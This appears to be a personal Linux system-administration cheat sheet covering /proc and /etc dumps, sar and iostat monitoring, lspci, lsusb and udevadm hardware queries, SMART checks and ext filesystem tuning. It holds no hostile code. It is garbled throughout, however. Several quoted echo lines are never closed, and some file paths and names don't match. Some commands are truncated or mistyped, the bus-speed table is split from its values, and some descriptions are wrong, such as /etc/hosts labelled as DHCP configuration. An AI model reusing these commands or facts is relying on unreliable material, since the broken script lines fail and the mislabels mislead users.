cat -vET /proc/sys/kernel/sg-big-buff >>  $TEMP_DIR/SCSI-sg-buffer.txt && cat -vET $TEMP_DIR/SCSI-sg-buffer.txt
echo "functions allowed to  be  invoked  by  the  SysRq  key"
cat -vET /proc/sys/kernel/sysrq >>  $TEMP_DIR/sysrq.txt && cat -vET $TEMP_DIR/sysrq.txt
echo " how aggressively the kernel will swap memory pages"
cat -vET /proc/sys/vm/swappiness >>  $TEMP_DIR/swappiness.txt && cat -vET $TEMP_DIR/swappiness.txt
echo "list of theSystem  V  Interprocess  Communication (IPC) objects "
echo "(respectively: message queues, semaphores, and shared memory) "
cat -vET /proc/sysvipc >>  $TEMP_DIR/sysvipc.txt && cat -vET $TEMP_DIR/sysvipc.txt
echo "mapped memory regions and their access permissions."
cat -vET /proc/$pid/maps >>  $TEMP_DIR/maps.txt && cat -vET $TEMP_DIR/maps.txt
echo "memory consumption of the processs mappings"
cat -vET /proc/$pid/smaps >>  $TEMP_DIR/smaps.txt && cat -vET $TEMP_DIR/smaps.txt
echo "This contains three numbers measuring the CPU load:"
cat -vET /proc/loadavg >>  $TEMP_DIR/loadavg.txt && cat -vET $TEMP_DIR/loadavg.txt
echo "Output from PID Status:"
cat -vET /proc/$pid/status >>  $TEMP_DIR/PidStatus.txt && cat -vET $TEMP_DIR/.txt
echo "/etc/networks Configuration:"
cat -vET /etc/networks >>  $TEMP_DIR/networks.txt && cat -vET networks.txt
echo "/etc/hosts DHCP Server Configuration Setup"
cat -vET /etc/hosts >>  $TEMP_DIR/hosts.txt && cat -vET $TEMP_DIR/hosts.txt
echo "/etc/ethers: Ethernet Configuration:"
cat -vET /etc/ethers >>  $TEMP_DIR/ethers.txt && cat -vET $TEMP_DIR/ethers.txt
echo "PROC Wireless Networking Statistics:"
cat -vET /proc/net/wireless >>  $TEMP_DIR/wireless.txt && cat -vET $TEMP_DIR/wireless.txt
echo "anycast6 Networking Statistics:"
cat -vET /proc/net/anycast6 >>  $TEMP_DIR/anycast6.txt && cat -vET $TEMP_DIR/anycast6.txt
echo "Proc Networking connector Statistics:"
cat -vET /proc/net/connector >>  $TEMP_DIR/connector.txt && cat -vET $TEMP_DIR/connector.txt



echo "Advanced  Power  Management  Version  And  Battery  Information"
cat -vET /proc/apm >>  $TEMP_DIR/apm.txt && cat -vET $TEMP_DIR/apm.txt
echo "PCMCIA Subdirectory devices"
cat -vET /proc/bus/pccard >>  $TEMP_DIR/pccard.txt && cat -vET $TEMP_DIR/pccard.txt
echo "PCMCIA Subdirectory drivers"
cat -vET /proc/bus/pccard/drivers >>  $TEMP_DIR/pccard-drivers.txt && cat -vET $TEMP_DIR/pccard-drivers.txt
echo "pseudo-files containing information about PCI busses, installed devices, and device drivers"
cat -vET /proc/bus/pci >>  $TEMP_DIR/pci.txt && cat -vET $TEMP_DIR/pci.txt
echo "Information  about  PCI  devices"
cat -vET /proc/bus/pci/devices >>  $TEMP_DIR/pci-devices.txt && cat -vET $TEMP_DIR/pci-devices.txt
echo "information about systems with the IDE bus"
cat -vET /proc/ide >>  $TEMP_DIR/ide.txt && cat -vET $TEMP_DIR/ide.txt
echo "information on a certain processes limits:"
cat -vET /proc/$pid/limits >>  $TEMP_DIR/limitspid.txt && cat -vET $TEMP_DIR/limitspid.txt
echo "information on a certain processes limits:"
cat -vET /proc/self/limits >>  $TEMP_DIR/limitsSelf.txt && cat -vET $TEMP_DIR/limitsSelf.txt
echo "Information On A Certain Processes Limits:"
cat -vET /proc/1/limits >>  $TEMP_DIR/limits1.txt && cat -vET $TEMP_DIR/limits.txt



echo -e "\t________________________________________________________"
echo -e "\t {+} ASCII Readable Dump of The Kernel ARP Table {+} "
echo -e "\t###################################"
cat -vET /proc/net/arp >>  $TEMP_DIR/arp.txt && cat -vET $TEMP_DIR/arp.txt
echo -e "\t_____________________________________________________________"
echo -e "\t {+} Reverse Address Lookup Services {+} "
echo -e "\t#######################################"
cat -vET /proc/net/rarp >>  $TEMP_DIR/rarp.txt && cat -vET $TEMP_DIR/rarp.txt







find /etc/cron* -name l[a-z]* | wc -l
















/var/run/utmp			## Information on uptime






## ================================================================================================= ##
## ------------------------------------------------------------------------------------------------- ##
collectd.conf		## Configuration for the system statistics collection daemon collectd
## ------------------------------------------------------------------------------------------------- ##
LoadPlugin			## controls which plugins to load.

## ------------------------------------------------------------------------------------------------- ##
## ================================================================================================= ##



Sort by service name:

getent services | cut -f1 -d/ | sort -u







echo "list all services which are started at bootup"
chkconfig --list |grep on








echo "permanently disable e.g. the runlevel service nfs"
chkconfig nfs off
echo "disable the runlevel service nfs"
/etc/init.d/nfs stop

echo "check status of xinetd"
/etc/init.d/xinetd status









chkconfig sysstat on
service sysstat start



The sar utility uses data stored by the sadc utility in /var/log/sa/


sadc (acronym for System Activity Data Collector) utility collects various
system resource usage data for sar .


/etc/sysconfig/sysstat
/etc/default/sysstat



The sa1 utility stores system activities in binary data files.
The sa2 creates a daily summary of sa1 ’s collected data.







cat /etc/cron.d/sysstat

# Run system activity accounting tool every 10 minutes
*/10 * * * * root /usr/lib64/sa/sa1 -S DISK 1 1
# 0 * * * * root /usr/lib64/sa/sa1 -S DISK 600 6 &
# Generate a daily summary of process accounting at 23:53
53 23 * * * root /usr/lib64/sa/sa2 -A







## ---------------------------------------------------------------------------------------------------------------------------- ##
	sar -u | less				## shows CPU usage
## ---------------------------------------------------------------------------------------------------------------------------- ##
	sar -d						## output disk statistics.
## ---------------------------------------------------------------------------------------------------------------------------- ##
	sar -b						## I/O and transfer rate statistics
## ---------------------------------------------------------------------------------------------------------------------------- ##
	sar -n DEV 5 2				## see how much activity came across your network interfaces
## ---------------------------------------------------------------------------------------------------------------------------- ##
	sar –u –r –n DEV			## details about the usage of CPU, I/O, memory, and network devices
## ---------------------------------------------------------------------------------------------------------------------------- ##
	sar -u 2 5					## Report CPU utilization for each 2 seconds. 5 lines are displayed.
## ---------------------------------------------------------------------------------------------------------------------------- ##
	sar -A						## Display all the statistics saved In current daily data file.
## ---------------------------------------------------------------------------------------------------------------------------- ##



## ---------------------------------------------------------------------------------------------------------------------------- ##
	sar -I 14 -o int14.file 2 10				## Report statistics on IRQ 14 for each 2 seconds. 
              									## 10 lines are displayed.  
              									## Data is stored  In  a file called int14.file.
## ---------------------------------------------------------------------------------------------------------------------------- ##
	sar -r -n DEV -f /var/log/sysstat/sa16		## Display memory and network statistics saved In daily data file 'sa16'.
## ---------------------------------------------------------------------------------------------------------------------------- ##
              






pgrep -u root sshd










vmstat 1 5 						# Print a report every second, for 5 times
iostat -dx 1 5  				# Print a detailed report for all devices every second, for 5 times
mpstat  						# Print a report about processor activities
mpstat 1 5  					# Print a report of global statistics among all processors every second, for 5 times
htop
iotop
powertop




## ---------------------------------------------------------------------------------------------------------------------------- ##
	iostat -d 2				## Display a continuous device report at two second intervals.
## ---------------------------------------------------------------------------------------------------------------------------- ##
	iostat -d 2 6			## Display six reports at two second intervals for all devices.
## ---------------------------------------------------------------------------------------------------------------------------- ##
	iostat -x sda sdb 2 6	## Display six reports of extended statistics at two second intervals for devices sda and sdb.
## ---------------------------------------------------------------------------------------------------------------------------- ##
	iostat -p sda 2 6		## Display six reports at two second intervals for device sda and all its partitions (sda1, etc.)
## ---------------------------------------------------------------------------------------------------------------------------- ##
	iostat -dx 1 5			## Print a detailed report for all devices every second, for 5 times
## ---------------------------------------------------------------------------------------------------------------------------- ##




iostat




cat /sys/block/hda/stat

grep 'hda ' /proc/diskstats







## Watch changeable data continuously ##
watch -n.1 'cat /proc/interrupts'





Print details about the systems RAM:

cat /proc/meminfo




Print the total memory (RAM) available on the system as follows:

cat /proc/meminfo | head -1


extract the processor name:		"
$ cat /proc/cpuinfo | sed -n 5p

















--config-file=/usr/share/dbus-1/system.conf

--config-file=/usr/share/dbus-1/session.conf

## ================================================================================================= ##
dbus-monitor 					## Monitor messages going through a D-Bus message bus
## ------------------------------------------------------------------------------------------------- ##
dbus-monitor --session			## Monitor session messages (default)
## ------------------------------------------------------------------------------------------------- ##
dbus-monitor --system			## Monitor system messages
## ================================================================================================= ##





















Hardware











when a partition or volume is formatted
several structures are put into place
depending on the filesystem type


echo -e "\t\t [+] One partition area holds the actual file data
the other area holds the structures containing items such as:


echo "[+] filesystem metadata

file metadata
journal files



echo "[?] File Metadata is stored In an $inode table"
 
echo "[?] when a file is created on the partition or volume"
echo "    a new entryin the inode table is created"
 
echo "[+] The $InodeTable is a table of index numbers called $Inodes"




echo "[?] An $Inode is a number uniquely assigned to a file when it is created "


echo "[?] The file type is either 

echo "    > c for "character" (or unbuffered) 	"
echo "               or 						"
echo "    > b for "block" (or buffered).		"




Unbuffered "character" devices provide direct access to the device

Buffered "block" devices are accessed through a buffer or 
cache which can greatly improve performance


you can read or write In blocks of any size including a single byte at a time.
The downside is that after you write data into a buffered device you know that the data is In the buffer but
you dont necessarily know if the contents of that buffer have been flushed to the device.




Copy-On-Write (COW) - When a files data is modified, the new data is written
to the storage mediums free space. 
Then pointers are updated to point to the new filesystems metadata.

In a non-COW filesystem, when that file’s data is modified, 
the old data is overwritten with the new data.

























    





/var/lib/usbutils/usb.ids			## (Debian)
/usr/share/hwdata/usb.ids			## (Red Hat)
/proc/bus/usb/*


## ================================================================================================= ##
lsusb -d 8086: 				## List all Intel USB devices
## ------------------------------------------------------------------------------------------------- ##
lsusb -tv					## 
## ------------------------------------------------------------------------------------------------- ##
lsusb -s 06:1				## 
## ================================================================================================= ##



lsusb ‐v | grep ‐A 5 Vendor

lsusb | grep Logitech



## ============================= ##
USB || 1.0 || 12mbps	|| 127 Devices	|| UHCI OHCI ||
USB || 2.0 || 480mbps					|| EHCI 	 ||
USB || 3.0 || 4.8Gb[s]
## ============================= ##

Human Interface Device (HID)
Input devices (mice, keyboards, etc.)






• usb hub can support 7 devices
• root hub supports up to 127 devices In total


### ========================== ###
###### Data Measurements: #######
### ========================== ###
• There are 8 $bits per $byte

• Bytes Per Second (Bps)
• Megabytes Per Second (MBps)
• Gigabits Per Second (Gbps)
## ========================== ##

Common Bus/Interface Speeds

Bus/interface						Speed

Internal buses
	PCI Express 3.0 x16				15750 MB/s
	PCI Express 3.0 x8				 7880 MB/s
	PCI Express 3.0 x4			
	PCI 64-bit/133MHz			
Storage drives
	SAS4
	SAS3
	SATA3
	SATA2
	SATA1
External interfaces
	Thunderbolt3
	Thunderbolt2
	USB3.1
	USB3.0
	GB Ethernet
	FW800
	USB2



3934 MB/s
1067 MB/s
2400 MB/s
1200 MB/s
600 MB/s
300 MB/s
150 MB/s
5000 MB/s
2500 MB/s
1250 MB/s
625 MB/s
125 MB/s
98 MB/s
60 MB/s











Industry Standard Architecture (ISA), the
Extended ISA (EISA), the VESA Local Bus (VLB), Micro Channel Architecture (MCA)



• PCI Express Port - a logical PCI-PCI Bridge structure. 


There are two types of PCI Express Port: 
• Root Port 
• Switch Port 


• Root Port originates a PCI Express link from a PCI Express Root Complex. 

• Switch Port connects PCI Express links to internal logical PCI buses.


PCI device drivers call pci_register_driver() during their
initialization with a pointer to a structure describing the driver.

















The central concepts of filesystems:

superblock
inode 
data block
directory block
indirection block 



The superblock 			contains information about the filesystem as a whole, 
						such as its size (the exact information here depends on the filesystem). 
						
inode 					contains all information about a file, except its name. 
						The name is stored In the directory, together with the number of the inode. 

Directory entry 		consists of a filename and the number of the inode which represents the file. 
						The inode contains the numbers of several data blocks, which are used to store 
						the data In the file. There is space only for a few data block numbers In the inode, 
						
indirect blocks			These dynamically allocated blocks - used as backup for pointers to the data blocks





inode contains all the information on a file, except its name.







chattr +mode file Add a file or directory attribute
chattr -mode file Remove a file or directory attribute
chattr =mode file Set a file or directory attribute, removing all other attributes




echo "Directory is being indexed using hashed trees"
chattr -I 

echo "All file data is written to the ext3 or ext4 journal" before being written to the file itself
chattr -j
echo "File has data stored inline within the inode itself"
chattr -N

echo "File will be securely wiped by zeroing when deleted"
chattr -s



echo "Recursively list attributes of directories and their contents."
lsattr -R

echo "Display the program version."
lsattr -V

echo "List all files inside directories, including files that  start  with .."
lsattr -a

echo "List  directories  like  other  files, rather than listing their contents."
lsattr -d





















echo "##-====================================================-##"
echo "   [+] List the CPU Manufactur
cat /proc/cpuinfo | sed -n 5p

cat /proc/meminfo | head -1


echo "##-====================================================-##"
echo "   [+] Verbose Output of your Processor Information:		"

dmidecode --type 4



grep MemTotal /proc/meminfo

grep -F capacity: /proc/acpi/battery/BAT0/info


echo "##-========================================-##"
echo "   [+] extract the processor name, use:		"
echo "##-========================================-##"
cat /proc/cpuinfo | sed -n 5p

echo "##-========================================================-##"
echo "   [+] Print details about the memory or RAM as follows:		"
echo "##-========================================================-##"
cat /proc/meminfo

echo "##-========================================================================-##"
echo "   [+] Print the total memory (RAM) available on the system as follows:		"
echo "##-========================================================================-##"
cat /proc/meminfo | head -1











cat /proc/$PID/environ | tr '\0' '\n'
(lspci -vvv; lsusb; lsmod; lscpu; 




dmesg --show-delta
dmesg --console-on
dmesg --console-level
dmesg --level=err,warn
dmesg --facility=daemon




(dmesg --kernel; dmesg --raw; dmesg --userspace; dmesg) > dmesg.txt

(cat /usr/share/misc/pci.ids) > pci-ids.txt
(cat /var/lib/usbutils/usb.ids) > usb-ids.txt










/usr/bin/lspci
/usr/bin/pcimodules
/usr/bin/setpci
/usr/bin/update-pciids
/usr/share/misc/pci.ids
/usr/share/doc/pciutils/examples


• /usr/share/misc/pci.ids 			(Debian)

• /usr/share/hwdata/pci.ids 			(Red Hat)


Devices matching the
Mass storage controller class (class ID 01) are of interest because they manage
attached storage media.


## lists all SATA mass storage controller 
## (class ID 01, subclass ID 06) devices:

lspci -d ::0106



enumerates all the SCSI, IDE, RAID, ATA, SATA, SAS,
and NVME mass storage controller devices on a system:


for i in 00 01 04 05 06 07 08; do lspci -d ::01$i; done


list all devices with the USB serial bus controller class 
(class ID 0C, subclass ID 03):

lspci -d ::0C03



enumerate all FireWire, USB, and Fibre Channel serial bus 
controllers on the examiner host:

for i in 00 03 04; do lspci -d ::0C$i; done


## ================================================================================================= ##
## ------------------------------------------------------------------------------------------------- ##
lspci -d 8086: 	## List all Intel hardware present
## ------------------------------------------------------------------------------------------------- ##
lspci -mm		# Produce machine-readable output (single -m for an obsolete format)
## ------------------------------------------------------------------------------------------------- ##
lspci -t		# Show bus tree
## ------------------------------------------------------------------------------------------------- ##
lspci -k		# Show kernel drivers handling each device
## ================================================================================================= ##
lspci -x		# Show hex-dump of the standard part of the config space
## ------------------------------------------------------------------------------------------------- ##
lspci -xxx		# Show hex-dump of the whole config space (dangerous; root only)
## ------------------------------------------------------------------------------------------------- ##
lspci -xxxx		# Show hex-dump of the 4096-byte extended config space (root only)
## ------------------------------------------------------------------------------------------------- ##
lspci -b		# Bus-centric view (addresses and IRQs as seen by the bus)
## ------------------------------------------------------------------------------------------------- ##
lspci -D		# Always show domain numbers
## ------------------------------------------------------------------------------------------------- ##
## ================================================================================================= ##




## ================================================================================================= ##
								Resolving of device IDs to names:
## ================================================================================================= ##
lspci -n		# Show numeric IDs
## ------------------------------------------------------------------------------------------------- ##
lspci -nn		# Show both textual and numeric IDs (names & numbers)
## ------------------------------------------------------------------------------------------------- ##
lspci -q		# Query the PCI ID database for unknown IDs via DNS
## ------------------------------------------------------------------------------------------------- ##
lspci -qq		# As above, but re-query locally cached entries
## ------------------------------------------------------------------------------------------------- ##
lspci -Q		# Query the PCI ID database for all IDs via DNS
## ------------------------------------------------------------------------------------------------- ##
## ================================================================================================= ##

-vmm

Device
Module
Class
Vendor
Slot




-O help
-A help






lspci -v | grep Ethernet




lspci -v -s 00:11.0
lspci -v | grep SATA




lspci -v -s 00:02.0
lspci -v | grep PCI




## list SATA mass storage controller (class ID 01 subclass ID 06)
lspci -d ::0106


## list Serial Bus Controller class (class ID 0C, subclass ID 03)
lspci -d ::0C03



echo "##-====================================================================================-##"
echo "   [+] lists all modules corresponding to currently pluggedin ethernet PCI devices.		"
echo "##-====================================================================================-##"
pcimodules --class 0x20000 --classmask 0xffff00
             

setpci --dumpregs




lsscsi is also useful for linking kernel 
device paths with device files in /dev:

[6:0:0:0]	disk	ATA			INTEL SSDSA2CW30 0302 /dev/sda
	dir: /sys/bus/scsi/devices/6:0:0:0 [/sys/devices/pci0000:00/0000:00:1f.2/ata7/
		host6/target6:0:0/6:0:0:0]


## specifying the SCSI address
lsscsi -vtg -L 16:0:0:0 > lsscsi.txt





lsscsi -s




echo "##-==================================-##"
echo "##------------------------------------##"
echo "   			[+] lsdev				"
echo "##------------------------------------##"
echo "##-==================================-##"


echo "##------------------------------------##"
echo "  [?] Displays the device:			  "
echo "##------------------------------------##"
echo "   • (location/slot/port)				  "
echo "   • DMA used							  "
echo "   • the irq used						  "
echo "   • any I/O ports reported			  "
echo "##------------------------------------##"




echo "##-====================================================-##"
echo "   [?] Information from this command is obtained from:	"
echo "##-====================================================-##"
echo "   • /proc/dma 											"
echo "   • /proc/ioports										"
echo "   • /proc/interrupts										"
echo "##------------------------------------------------------##"


echo "##----------------------------------------------------------------------------------------------##"
echo "   [?] Contains kernel messages whenever a newly-detected hardware device is added or removed		"
echo "##----------------------------------------------------------------------------------------------##"


echo "##-==============================================-##"
echo "   [?] Logs hardware information:					  "
echo "##-==============================================-##"
echo "##------------------------------------------------##"
echo "   • /var/log/message (RedHat/CentOS systems)		  "
echo "   • /var/log/syslog (Debian/Ubuntu systems)		  "
echo "##------------------------------------------------##"





lshal									## Show a list of all devices with their properties


Dmidecode							## Show DMI/SMBIOS: hw info from the BIOS






grep MemTotal /proc/meminfo


cat /proc/bus/input/devices | grep Sysfs



cat /proc/bus/input/devices
cat /proc/bus/input/devices | grep Sysfs
cat /proc/bus/input/handlers


cat iomem | grep Kernel
cat iomem | grep reserved
cat ioports | grep smbus
cat ioports | grep PCI






UDev Consists of: 

A Userspace Daemon (udevd) --> Receives $UEvents <--- The Kernel 						## Receives UEvents From The Kernel 

Communication between
$UserspaceDaemon <--> The Kernel 
	> done through the sysfs pseudo filesystem.


















##-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-##
	   	 Internal 				   File System
##-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-##
   	  Kernel objects			   Directories
## ============================================= ##
	 Object attributes 			 Regular files
## ============================================= ##
   Object relationships			Symbolic links
## ============================================= ##



The directory "/etc/udev.d" holds all the rules to be applied when adding or removing a device.



The hald process is the daemon that maintains a database of 
the devices connected to the system In real time.



To get hardware debug info, use the kernel parameter udev.log‐priority=debug

udevd
/etc/udev/udev.conf

udev_log="debug"


This option can also be compiled into your initramfs by adding the config file to your FILES array



/etc/mkinitcpio.conf

FILES="... /etc/udev/udev.conf"


then rebuilding the initramfs with:

mkinitcpio ‐p linux




udevadm --name=sda


udevadm info -q path -n "${dev}"

udevprop ${devpath} DEVTYPE




echo "##-================================================-##"
echo "   [+] Show all kernel uevents and udev messages		"
echo "##-================================================-##"
udevadm monitor


echo "##-================================================================================-##"
echo "   [+] Print all attributes of device /dev/sda within the udev rules key format		"
echo "##-================================================================================-##"
udevadm info --attribute-walk --name=/dev/sda




## force udev to re load all rule s
udevadm control --reload


## force udev to re-apply all rules to already existing devices
udevadm trigger

echo "##-========================================================================-##"
echo "   [+] Print the size attribute of disk sda within the 512-byte blocks. 		"
echo "       This information is retrieved from sysfs								"
echo "##-========================================================================-##"
cat /sys/block/sda/size







echo "##-========================================================================-##"
echo "   [+] Simulate a udev event run by the device and print debug output		"
echo "##-========================================================================-##"
udevadm test /dev/sdb








echo "##-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-##"
echo "   [+] udevadm Info - Queries the udev database for device information		"
echo "##-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-##"
echo
echo "## -------------------------------------------------------------------------------- ##"
echo "   [?] It can also query the properties of a device from its sysfs representation		"
echo "## -------------------------------------------------------------------------------- ##"


Query parameter - Valid TYPEs are: 

udevadm Info --query=name
udevadm Info --query=symlink
udevadm Info --query=path
udevadm Info --query=property
udevadm Info --query=all


--path=


echo "##-=========================================================-##"
echo "   [?] If you dont know the device name you can:				 "
echo "## --------------------------------------------------------- ##"
echo "   [+] list all attributes of a specific system path:			 "
echo "##-=========================================================-##"

udevadm info ‐a ‐p /sys/class/backlight/acpi_video0


udevadm info ‐q path ‐n /dev/sdb

or

find /sys/devices/ ‐name sdb



get a list of all of the attributes of a device

udevadm info -a -n



udevadm info -a -n /dev/sd



udevadm info /dev/sdb | grep ID_SERIAL



udevadm info -a -p $(udevadm info -q path -n /dev/video2)



udevadm info /sys/class/net/* | grep ID_NET_NAME



--devpath=/class/block/sda
udevadm /sys/class/block/sda

--name=

udevadm --name=sda


echo "##-====================================================================================-##"
echo "   [+] Attribute Walk - Print all sysfs properties of the specified device that can be 	"
echo "                        Used within the udev rules to match the specified device.			"
echo "##-====================================================================================-##"

echo "## -------------------------------------------------------------------------------------- ##"
echo "   [?] It prints all devices along the chain,  
echo "       Up to the Root of sysfs that can be used In udev rules.
echo "## -------------------------------------------------------------------------------------- ##"


udevadm Info --attribute-walk		## 



##-================================================================================-##
##----------------------------------------------------------------------------------##
	udevadm Info --export                 ## Export key/value pairs
##----------------------------------------------------------------------------------##
	udevadm Info --export-prefix          ## Export the key name with a prefix
##----------------------------------------------------------------------------------##
	udevadm Info --export-db              ## Export the content of the udev database
##----------------------------------------------------------------------------------##
	udevadm Info --cleanup-db             ## Clean up the udev database
##----------------------------------------------------------------------------------##
##-================================================================================-##






udevadm info /sys/class/net/eth0

udevadm info /sys/class/net/wlan0




udevadm info --export-db > udev.txt


echo "##-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-##"
echo "   [+] udevadm monitor - Listens to the kernel uevents and events sent out by a udev rule 	 "
echo "                         And then prints the devpath of the event to the console.				 "
echo "##-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-##"

udevadm monitor --help

udevadm monitor --kernel
udevadm monitor --udev
udevadm monitor --property


udevadm monitor --subsystem-match=
udevadm monitor --tag-match=




--parent-match=
--name-match=
--sysname-match=
--subsystem-match=



udevadm monitor --environment --udev
ACTION=unbind
ACTION=remove
DEVTYPE=disk
DEVTYPE=partition
DEVTYPE=usb_interface

ID_VENDOR=Kingston
ID_MODEL=DataTraveler_3.0
SUBSYSTEM=block
SUBSYSTEM=scsi_device
SUBSYSTEM=scsi
SUBSYSTEM=scsi_host
SUBSYSTEM=usb





echo "##-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-##"
udevadm Trigger - Request device events from the kernel. 
				  Primarily used to replay events at system coldplug time


udevadm trigger 
udevadm trigger --verbose
udevadm trigger --type=	devices
udevadm trigger --type=subsystems


udevadm trigger --action=change



echo "##-========================================================================-##"
echo "   [+] Trigger events for devices which belong to a matching subsystem.		"
echo "##-========================================================================-##"
udevadm trigger --subsystem-match=


echo "##-============================================================================-##"
echo "   [+] Do not trigger events for devices which belong to a matching subsystem:	"
echo "##-============================================================================-##"
udevadm trigger --subsystem-nomatch=


echo "##-=================================================================-##"
echo "   [+] Trigger events for devices with a matching sysfs attribute.	 "
echo "##-=================================================================-##"
udevadm trigger --attr-match=

udevadm trigger --attr-nomatch=




echo "##-=================================================================-##"
echo "   [+] Trigger events for devices with a matching property value.		 "
echo "##-=================================================================-##"
udevadm trigger --property-match=








echo "##-====================================================================================-##"
echo "   [+] udevadm Control - Modify the internal state of the running udev daemon


--log-priority=emerg, alert, crit, err, warning, notice, info, and debug




echo "##-========================================================================-##"
echo "   [+] Signal systemd-udevd to reload the rules files and other databases 	"
echo "                    (like the kernel module index)							"
echo "##-========================================================================-##"
echo 
echo "##----------------------------------------------------------------------------------##"
echo "   [?] Reloading rules and databases does not apply any changes to already  			"
echo "       Existing devices. The new configuration will only be applied to new events.	"
echo "##----------------------------------------------------------------------------------##"


udevadm control --reload




echo "##-============================================-##"
echo "   [+] Set a global property for all events:		"
echo "##-============================================-##"
udevadm control --property=





manually force udev to trigger your rules

udevadm trigger





udevadm monitor ‐‐environment ‐‐udev





echo "##-====================================-##"
echo "   [+] Testing rules before loading		"
echo "##-====================================-##"
udevadm test $(udevadm info ‐q path ‐n [device name]) 2>&1

or

echo "##-=================================================================================-##"
echo "   [+] Directly provide the path to the device you want to test the udev rule for:	 "
echo "##-=================================================================================-##"
udevadm test /sys/class/backlight/acpi_video0/















echo "Browser for the HAL device manager"
gnome-device-manager




systool -b scsi

systool -c net

systool -p -c net



tree /sys/class/net

tree -F /dev/disk

find /sys -name sda

tree /sys/block/sda

tree /sys/block

ls -F /sys/devices

tree -F /sys/devices/cpu




/sys | wc -l
/sys -type f | wc -l
/sys -type d | wc -l
/sys -type l | wc -l


echo "####################################################"
iftop Example BPF filters
echo "####################################################"
iftop -i eth0 -f 'port (80 or 443)'
iftop -i eth0 -f 'ip dst 192.168.1.5'


















































# Show how old your linux OS installtion is
sudo tune2fs -l $(df -h / |(read; awk '{print $1; exit}')) | grep -i created


# Filesystem directory indexing
# enable the feature with tune2fs:
tune2fs -O dir_index /dev/sda1






# Index Directories - Convert existing directories to the hashed B-tree format.
e2fsck -D /dev/sda1


#####################################################################################################
fsck -N				# dont execute, just show what could be done
fsck -As			# Check and repair serially all filesystems listed In /etc/fstab
fsck -f /dev/sda1	# Force a filesystem check on /dev/sda1 even if it thinks is not necessary

fsck -fv /dev/sda1	# Force another check, this time with verbose output:
fsck -y /dev/sda1	# During filesystem repair, do not ask questions and assume that the answer is always yes

fsck -b 32768 /dev/hda2						## Pass In one of the backup superblocks as an option to fsck:
mount sb=32768 /dev/hda2 /mnt				## If you still have problems, try passing the backup superblock into mount explicitly:





#####################################################################################################


#####################################################################################################
fsck.ext2 -c /dev/sda1		# Check a ext2 filesystem, running the badblocks command
e2fsck -c /dev/sda1			# mark all bad blocks and add them to the bad block inode to prevent 
							# them from being allocated to files or directories
#####################################################################################################
e2fsck -p		## Automatic repair (no questions)
e2fsck -n		## Make no changes to the filesystem
e2fsck -y		## Assume "yes" to all questions
e2fsck -c		## Check for bad blocks and add them to the badblock list
e2fsck -f		## Force checking even if filesystem is marked clean
e2fsck -v		## Be verbose

e2fsck -b superblock			## Use alternative superblock
e2fsck -B blocksize				## Force blocksize when looking for superblock
e2fsck -j external_journal		## Set location of the external journal
e2fsck -l bad_blocks_file		## Add to badblocks list
e2fsck -L bad_blocks_file		## Set badblocks list






# write-back mode, metadata is recorded which increases throughput
tune2fs -O has_journal -o journal_data_writeback /dev/sda1


dumpe2fs /dev/sdd | grep Backup


echo "##-=========================================================-##"
echo "   [+] 

tune2fs -l /dev/sda | grep 'Block size'




echo "##-=========================================================-##"
echo "   [+] 
echo "##-========================================================================-##"
getconf PAGE_SIZE



echo "##-========================================================================-##"
echo "   [+] Enable support for ext4 metadata checksums on a new file system:		"
echo "##-========================================================================-##"
mkfs.ext4 -O metadata_csum /dev/sda

tune2fs -O metadata_csum /dev/sda`





/etc/smartd.conf
/etc/smartmontools/smartd.conf


smartd daemon will check SMART devices every 30 minutes

You can change the polling times and who receives messages through the config file



SMART Attributes - Are saved in the devices protected area

You can schedule device test events with the smartd daemon


smartctl -a "/dev/mapper/*"
smartctl -a "/dev/sd[a-z]"
smartctl -a "/dev/sd[a-z]"
smartctl -a /dev/sda		# Print SMART information for drive /dev/sda
smartctl -s off /dev/sda	# Disable SMART monitoring and log collection for drive /dev/sda
smartctl -t long /dev/sda	# Begin an extended SMART self-test on drive /dev/sda

smartctl --all /dev/hda
smartctl --capabilities
smartctl --health
smartctl --attributes
smartctl --scan-open
smartctl --scan
smartctl --xall
smartctl --all
smartctl --info



'smartctl' -H -i -c -A -l error -l selftest -l selective '/dev/sdb'


'smartctl' -i -H -c '/dev/sdc'

'smartctl' -d scsi -i -H -c '/dev/sde'


echo "##-================================================-##"
echo "   [+] Print SMART information for drive /dev/sda		"
echo "##-================================================-##"
smartctl -a /dev/sda 			


echo "##-=====================================================================-##"
echo "   [+] Disable SMART monitoring and log collection for drive /dev/sda		 "
echo "##-=====================================================================-##"
smartctl -s off /dev/sda 			


echo "##-=====================================================================-##"
echo "   [+] "
echo "##-=====================================================================-##"
smartctl -t long /dev/sda 



smartctl --scan | grep -v '^#' | cut -d' ' -f1







echo "## ============================================================================== ##"
echo "   [?] so hddtemp must be restarted after an update is applied to the database:	  "
echo "## ============================================================================== ##"



echo "##-================================-##"
echo "   [+] Example of type forcing:		"
echo "##-================================-##"
hddtemp SATA:/dev/sda PATA:/dev/hda



echo "## ======================================================== ##"
echo "   [+] To test hddtemp i.n daemon mode, start it like this:	"
echo "## ======================================================== ##"
hddtemp -d /dev/hd[abcd]


## HDDTemp queries the SMART interface for a drive’s temperature
hddtemp /dev/sdb

## more detailed output on a disk’s temperature
## in some cases a temperature history
smartctl -x /dev/sdb



You can suspend a task that you think will overheat the disk:

kill -SIGTSTP $PID






tune2fs -j /dev/sda			# convert ext2 to ext3 FS
tune2fs -C 4 /dev/sda1		# Set the mount count of the filesystem to 4
tune2fs -c 20 /dev/sda1		# Set the filesystem to be checked by fsck after 20 mounts
tune2fs -c 2 /dev/sda1
tune2fs -i 15d /dev/sda1	# Set the filesystem to be checked by fsck each 15 days
tune2fs -m 5% /dev/sda1				## Reserve 5% of the partition for superuser
